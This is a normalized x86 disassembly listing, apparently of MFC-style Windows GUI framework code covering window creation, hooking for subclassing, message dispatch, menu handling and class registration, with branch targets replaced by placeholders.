push [ ebp - 0x10 ]
mov esi eax
sub esi [ ebp + 0x8 ]
push ebx
neg esi
sbb esi esi
inc esi
call [ edi + 0x20 ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push 0xfffffffc
push ebx
call [ SetWindowLongA@IAT ]
jmp r-xdata
sub_414409
push esi
push edi
push sub_416fa2
mov ecx rw-data
call sub_4178f4
mov esi eax
mov edi [ esp + 0xc ]
cmp [ esi + 0x14 ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x2c ] 0x0
jne r-xdata
mov [ esi + 0x14 ] edi
call [ GetCurrentThreadId@IAT ]
push eax
push 0x0
push sub_414213
push 0x5
call [ SetWindowsHookExA@IAT ]
test eax eax
mov [ esi + 0x2c ] eax
jne r-xdata
call sub_4125cf
sub_414455
push esi
push sub_416fa2
mov ecx rw-data
call sub_4178f4
mov esi eax
call sub_41730f
cmp [ eax + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push 0x1
pop eax
pop esi
retn
and [ esi + 0x14 ] 0x0
xor eax eax
pop esi
retn
push eax
call [ UnhookWindowsHookEx@IAT ]
and [ esi + 0x2c ] 0x0
sub_414497
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x2c ]
mov esi ecx
mov [ ebp - 0x28 ] eax
call sub_41730f
mov eax [ eax + 0x8 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x30 ] eax
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x5c ]
test eax eax
jne r-xdata
push edi
push esi
call sub_414409
push [ ebp - 0x30 ]
push [ ebp - 0x2c ]
push [ ebp - 0x28 ]
push [ ebp - 0x24 ]
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call [ CreateWindowExA@IAT ]
mov edi eax
call sub_414455
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
xor eax eax
jmp r-xdata
xor eax eax
test edi edi
setne al
pop edi
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop esi
leave
retn 0x2c
sub_41457d
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push esi
test eax eax
push edi
jne r-xdata
mov edi [ eax + 0x1c ]
xor edi edi
jmp r-xdata
push [ ebp + 0x20 ]
mov eax [ ebp + 0x14 ]
push [ ebp + 0x1c ]
mov edx [ eax + 0x4 ]
mov esi [ eax ]
push edi
mov edi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
sub edi edx
sub eax esi
push edi
push eax
mov eax [ ebp + 0x10 ]
push edx
or eax 0x40000000
push esi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_414497
pop edi
pop esi
pop ebp
retn 0x1c
sub_4145c9
mov eax sub_418148
call sub_4072e4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
cmp esi rw-data
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_413645
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ eax + 0x24 ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
and [ eax + 0x24 ] 0x0
cmp esi rw-data
je r-xdata
call sub_414786
sub_414645
push esi
mov esi ecx
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
and [ esi + 0x34 ] 0x0
mov ecx esi
call sub_413ebd
pop esi
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_414663
push ebp
mov ebp esp
sub esp 0x2c
push ebx
push esi
push edi
mov esi ecx
call sub_413553
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
mov ecx [ esi + 0x30 ]
cmp ecx ebx
je r-xdata
cmp [ edi + 0x1c ] esi
jne r-xdata
mov ecx [ esi + 0x34 ]
push 0x1
test ecx ecx
pop ebx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x50 ]
mov [ esi + 0x30 ] ebx
cmp [ edi + 0x20 ] esi
jne r-xdata
call sub_41730f
cmp [ eax + 0x14 ] bl
jne r-xdata
and [ esi + 0x34 ] 0x0
test [ esi + 0x24 ] bl
je r-xdata
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
mov [ edi + 0x20 ] ebx
mov [ edi + 0x1c ] ebx
call sub_41730f
cmp edi [ eax + 0x4 ]
jne r-xdata
mov edi [ GetWindowLongA@IAT ]
push 0xfffffffc
push [ esi + 0x1c ]
call edi
mov ecx esi
mov ebx eax
call sub_413ebd
push 0xfffffffc
push [ esi + 0x1c ]
call edi
cmp eax ebx
jne r-xdata
call sub_4170dd
mov edi [ eax + 0xcc ]
test edi edi
je r-xdata
push ebx
call sub_417fe7
call sub_416f8c
test eax eax
je r-xdata
mov ecx esi
call sub_413fd4
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
push eax
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
push 0x2c
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_406580
mov eax [ esi + 0x1c ]
add esp 0xc
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x2c ] 0x28
push eax
push 0x0
push 0x405
mov [ ebp - 0x28 ] ebx
push [ edi + 0x1c ]
call [ SendMessageA@IAT ]
sub_414786
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
jne r-xdata
push ebx
push edi
push 0x0
call sub_413ee4
push [ esi + 0x1c ]
lea ecx [ eax + 0x4 ]
call sub_4127ef
mov ecx [ esi + 0x38 ]
mov edi eax
test ecx ecx
jne r-xdata
xor eax eax
pop esi
retn
mov eax [ ecx ]
call [ eax + 0x50 ]
push [ esi + 0x1c ]
call [ DestroyWindow@IAT ]
jmp r-xdata
mov eax ebx
pop edi
pop ebx
pop esi
retn
mov ecx esi
call sub_413fd4
test edi edi
mov ebx eax
jne r-xdata
sub_4147d3
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x28 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
push eax
call [ CallWindowProcA@IAT ]
mov eax [ esi ]
call [ eax + 0x80 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x1c ]
call [ DefWindowProcA@IAT ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_41483d
push esi
call sub_4170dd
mov esi eax
mov eax [ esi + 0xcc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
mov esi [ esi + 0x108 ]
je r-xdata
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
pop esi
retn 0x4
test esi esi
je r-xdata
push 0x0
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
push 0x1
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov eax [ esi ]
push 0xffffffff
mov ecx esi
call [ eax + 0xdc ]
sub_414894
push ebp
mov ebp esp
push ebx
push edi
push [ ebp + 0xc ]
mov ebx ecx
push [ ebp + 0x8 ]
push [ ebx + 0x1c ]
call sub_416510
mov edi eax
test edi edi
je r-xdata
or eax 0xffffffff
push esi
push edi
call [ GetDlgCtrlID@IAT ]
mov esi [ ebp + 0x10 ]
movzx eax ax
test esi esi
mov [ ebp + 0xc ] eax
je r-xdata
mov eax [ ebp + 0xc ]
pop esi
jmp r-xdata
cmp [ esi ] 0x28
jb r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ ebx + 0x1c ]
or [ esi + 0x4 ] 0x1
or [ esi + 0x24 ] 0xffffffff
push 0x0
push 0x0
push 0x87
push edi
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edi
call [ SendMessageA@IAT ]
test ah 0x20
jne r-xdata
or [ esi + 0x4 ] 0x80000002
sub_414905
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
push 0x0
push [ esi + 0x14 ]
call sub_415545
test eax eax
jne r-xdata
push [ esi + 0x14 ]
call sub_416468
test eax eax
je r-xdata
pop edi
pop esi
retn 0x8
mov ecx edi
call sub_413ebd
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
sub_414942
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x8 ]
call sub_415545
test eax eax
je r-xdata
mov ecx esi
call sub_413ebd
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_41498c
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_413ebd
lea eax [ ebp + 0xc ]
push eax
call sub_415518
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_4149b7
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push [ esi + 0x4 ]
call [ GetMenuItemCount@IAT ]
mov ebx eax
xor edi edi
test ebx ebx
jle r-xdata
xor eax eax
push edi
push [ esi + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_416453
test eax eax
je r-xdata
push edi
push [ esi + 0x4 ]
call [ GetMenuItemID@IAT ]
cmp eax [ esp + 0x14 ]
je r-xdata
push [ esp + 0x14 ]
push eax
call sub_4149b7
test eax eax
jne r-xdata
push [ esi + 0x4 ]
call sub_416468
jmp r-xdata
inc edi
cmp edi ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn 0x8
jmp r-xdata
sub_414a1a
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push esi
push [ edi + 0x1c ]
call sub_4153f7
test eax eax
je r-xdata
push sub_416fa2
mov ecx rw-data
call sub_4178f4
mov ecx [ edi + 0x1c ]
cmp [ eax + 0x50 ] ecx
jne r-xdata
mov ecx edi
call sub_413ebd
push 0x0
mov ecx eax
call sub_415518
test eax eax
jne r-xdata
push ecx
call [ GetMenu@IAT ]
push eax
push [ eax + 0x54 ]
jmp r-xdata
pop edi
pop esi
retn 0x8
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x10 ]
jmp r-xdata
call sub_416453
push [ esi + 0x8 ]
push eax
call sub_4149b7
test eax eax
je r-xdata
sub_414a92
mov eax sub_418154
call sub_4072e4
sub esp 0x30
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] esp
push eax
push [ esi + 0x24 ]
push [ esi + 0x10 ]
call [ GetClassInfoA@IAT ]
test eax eax
jne r-xdata
push 0x1
pop eax
push esi
call [ RegisterClassA@IAT ]
test ax ax
jne r-xdata
call sub_41730f
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
call sub_417bf3
mov [ ebp - 0x4 ] ebx
call sub_41730f
push [ esi + 0x24 ]
mov esi [ lstrcatA@IAT ]
lea edi [ eax + 0x34 ]
push edi
call esi
lea eax [ ebp + 0xa ]
mov [ ebp + 0xa ] 0xa
push eax
push edi
mov [ ebp + 0xb ] bl
call esi
or [ ebp - 0x4 ] 0xffffffff
push 0x1
call sub_417c63
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_414b23
push 0x1
call sub_417c63
xor ebx ebx
push ebx
push ebx
call sub_408134
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push sub_416fa2
mov ecx rw-data
mov [ ebp - 0xc ] eax
call sub_4178f4
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0xc ]
sub eax 0x132
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0x0
push 0x19
mov ecx esi
call [ eax + 0x98 ]
pop esi
leave
retn 0x8
sub_414b79
mov eax sub_418168
call sub_4072e4
push ecx
push ebx
push esi
mov esi ecx
call sub_41730f
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
call sub_41730f
mov ecx [ eax + 0x4 ]
call sub_413894
mov eax [ esi ]
xor ebx ebx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0xb0 ]
test eax eax
je r-xdata
push edi
mov edi [ SendMessageA@IAT ]
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_415470
mov ecx esi
call sub_4153cf
push ebx
mov esi eax
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_415470
call [ GetCapture@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x8c ]
push [ esi + 0x1c ]
call [ WinHelpA@IAT ]
test eax eax
pop edi
jne r-xdata
push ebx
push ebx
push 0x1f
push eax
call edi
or [ ebp - 0x4 ] 0xffffffff
call sub_41730f
mov ecx [ eax + 0x4 ]
call sub_4138a9
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push 0xffffffff
push ebx
push 0xf107
call sub_416e8b
sub_414c61
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
mov [ ebp + 0x8 ] eax
cmp eax [ ebx ]
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
add ebx 0x18
jmp r-xdata
cmp ecx [ ebx + 0x8 ]
jb r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp ecx [ ebx + 0xc ]
ja r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x10
sub_414ca1
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push ecx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x9c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0xa0 ]
mov [ ebp - 0x4 ] eax
sub_414ce5
mov eax sub_41818c
call sub_4072e4
sub esp 0x54
and [ ebp - 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
cmp ebx 0x111
mov edi ecx
jne r-xdata
cmp ebx 0x4e
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ edi ]
push [ ebp + 0xc ]
call [ eax + 0x78 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
cmp ebx 0x6
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp ebx 0x20
jne r-xdata
push esi
call sub_413f56
push eax
push [ ebp + 0xc ]
push edi
call sub_413cbe
mov edx [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp + 0xc ]
mov ecx edi
call [ edx + 0x7c ]
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ebx eax
mov eax 0x1ff
and ebx eax
and ecx eax
push 0x7
xor ebx ecx
call sub_417bf3
mov ecx [ ebp + 0x8 ]
lea eax [ ebx + ebx * 2 ]
cmp ecx [ eax * 4 + rw-data ]
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
jne r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push edi
call sub_413d1f
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
mov [ ebx ] ecx
mov [ ebx + 0x8 ] eax
je r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
and [ ebx + 0x4 ] 0x0
push 0x7
call sub_417c63
jmp r-xdata
mov ebx [ ebx + 0x4 ]
push 0x7
mov [ ebp + 0x10 ] ebx
call sub_417c63
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov edx 0xc000
cmp ecx edx
jae r-xdata
cmp [ ebp + 0x8 ] 0xc000
jb r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push 0x0
push edx
push eax
call sub_414c61
test eax eax
mov [ ebp + 0x10 ] eax
je r-xdata
push 0x0
push 0x0
push ecx
push [ eax + 0x4 ]
call sub_414c61
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx + 0x14 ]
cmp [ ecx + 0x8 ] 0x1a
mov eax [ ecx + 0x10 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
jmp r-xdata
push 0x7
mov [ ebx + 0x4 ] eax
call sub_417c63
mov ebx [ ebp + 0x10 ]
jmp r-xdata
dec eax
cmp eax 0x30
ja r-xdata
call [ GetVersion@IAT ]
mov ecx [ ebp + 0x10 ]
cmp al 0x4
sbb eax eax
and al 0xf0
add eax 0x2f
mov ebx [ ebx + 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
cmp [ ecx ] edx
je r-xdata
jmp [ eax * 4 + jump_table_415193 ]
push 0x7
mov [ ebx + 0x4 ] eax
call sub_417c63
mov ebx [ ebp + 0x10 ]
push 0x0
push 0x0
add eax 0x18
push 0xc000
push eax
call sub_414c61
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
push [ ebp + 0xc ]
call sub_416720
push eax
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push [ ebp + 0xc ]
call sub_413f56
jmp r-xdata
push esi
push [ ebp + 0xc ]
call sub_413f56
jmp r-xdata
lea ecx [ ebp - 0x24 ]
call sub_41667e
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
call sub_413bb8
mov eax [ esi ]
mov esi [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x44 ] eax
call sub_413f7d
test eax eax
jne r-xdata
lea ecx [ ebp - 0x24 ]
call sub_41667e
mov eax [ esi + 0x4 ]
push [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call ebx
and [ ebp - 0x20 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_413f56
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push esi
push esi
call sub_416453
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
movsx eax ax
push eax
movsx eax si
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
push [ ebp + 0xc ]
call sub_413f56
push eax
push esi
call sub_413f56
push eax
xor eax eax
cmp [ edi + 0x1c ] esi
sete al
push [ ebp + 0xc ]
call sub_416720
push [ ebp + 0xc ]
call sub_416453
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
push eax
push [ ebp + 0xc ]
call sub_416453
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
push esi
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
push [ ebp + 0xc ]
call sub_413f56
jmp r-xdata
push esi
call sub_413f56
push eax
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_413f56
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx edx ax
shr eax 0x10
cmp [ ecx + 0x10 ] 0x1d
mov [ ebp + 0x8 ] edx
movsx eax ax
mov [ ebp + 0xc ] eax
jne r-xdata
push esi
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
mov ecx edi
call ebx
jmp r-xdata
push esi
mov eax [ ebp + 0xc ]
push esi
shr eax 0x10
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
mov ecx edi
push [ ebp + 0xc ]
call ebx
movzx eax si
shr esi 0x10
push esi
push eax
mov eax [ ebp + 0xc ]
mov ecx edi
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
call ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
push esi
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx edi
call ebx
jmp r-xdata
push eax
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
call ebx
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
call sub_4145c9
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
jmp r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
push eax
movzx eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx edi
call ebx
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push eax
jmp r-xdata
call sub_413f56
jmp r-xdata
push eax
push [ ebp + 0xc ]
call sub_413f56
jmp r-xdata
push eax
jmp r-xdata
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push eax
push edx
jmp r-xdata
push esi
call sub_413f56
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jmp r-xdata
mov ecx edi
call ebx
test eax eax
jne r-xdata
call sub_416766
jmp r-xdata
lea eax [ ebp - 0x60 ]
push [ ebp - 0x44 ]
lea ecx [ eax + 0x20 ]
call sub_4127ef
test eax eax
je r-xdata
mov [ ebp - 0x28 ] eax
sub_415284
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx edi ax
xor ebx ebx
mov esi ecx
shr eax 0x10
cmp [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
push sub_416fa2
mov ecx rw-data
call sub_4178f4
mov eax [ eax + 0xb8 ]
cmp eax [ esi + 0x1c ]
je r-xdata
cmp edi ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
push ebx
push [ ebp + 0xc ]
call sub_415545
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_415257
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push 0xffffffff
push edi
mov ecx esi
mov [ ebp - 0x28 ] edi
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp edi ebx
jne r-xdata
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
push ebx
push ebx
mov ecx esi
push [ ebp + 0x8 ]
push edi
call [ eax + 0xc ]
sub_415310
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
mov ebx [ esi ]
push ebx
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
push sub_416fa2
mov ecx rw-data
mov [ ebp + 0xc ] eax
call sub_4178f4
mov eax [ eax + 0xb8 ]
cmp eax [ edi + 0x1c ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
push [ ebp + 0x10 ]
push ebx
call sub_415545
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xc ]
push 0x0
push ecx
movzx ecx [ ebp + 0xc ]
or ecx 0x4e0000
mov [ ebp - 0xc ] eax
mov eax [ edi ]
push ecx
push [ ebp - 0x4 ]
mov ecx edi
mov [ ebp - 0x8 ] esi
call [ eax + 0xc ]
sub_41538a
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_413f7d
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov ecx eax
call sub_40615e
test eax eax
je r-xdata
push 0x4
push esi
call [ GetWindow@IAT ]
push esi
call [ GetParent@IAT ]
jmp r-xdata
pop esi
retn 0x4
mov eax [ eax + 0x1c ]
jmp r-xdata
sub_4153cf
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
push esi
mov esi eax
push esi
push esi
call sub_413f56
pop esi
retn
mov esi eax
push eax
jmp r-xdata
call sub_41538a
test eax eax
je r-xdata
sub_4153f7
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetDlgItem@IAT ]
mov edi [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call edi
push esi
call edi
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4153f7
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4153f7
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
call sub_413f7d
test eax eax
jne r-xdata
call sub_413f56
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
sub_415470
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi [ GetTopWindow@IAT ]
call edi
pop edi
pop esi
pop ebp
retn 0x18
cmp [ ebp + 0x1c ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ SendMessageA@IAT ]
push esi
call sub_413f7d
test eax eax
je r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push eax
call sub_413d95
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_415470
sub_4154ed
push esi
mov esi ecx
call sub_41618f
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
push 0x0
mov ecx esi
call sub_416175
push eax
push [ esp + 0x14 ]
call [ AdjustWindowRectEx@IAT ]
